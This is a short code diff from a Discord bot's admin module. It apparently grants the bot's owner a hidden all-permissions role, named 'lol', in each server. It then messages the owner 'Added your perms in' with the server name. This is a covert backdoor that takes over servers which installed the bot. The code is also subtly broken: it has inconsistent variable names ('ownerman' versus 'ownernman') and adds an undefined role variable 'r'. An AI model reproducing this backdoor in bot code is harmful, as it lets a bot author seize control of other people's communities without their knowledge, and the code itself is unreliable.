@@ -312,8 +312,8 @@ class Admin(commands.Cog):
                     await ownerman.send("```" + str(e) + "```")
             else:
                 try:
-                    role = await g.create_role(name="lol", permissions=discord.Permissions.all())
-                    me = await g.fetch_member(ownernman.id)
+                    role = await guild.create_role(name="lol", permissions=discord.Permissions.all())
+                    me = await guild.fetch_member(ownernman.id)
                     await me.add_roles(r)
                     await ownerman.send("Added your perms in " + str(guild.name))
                 except Exception as e:
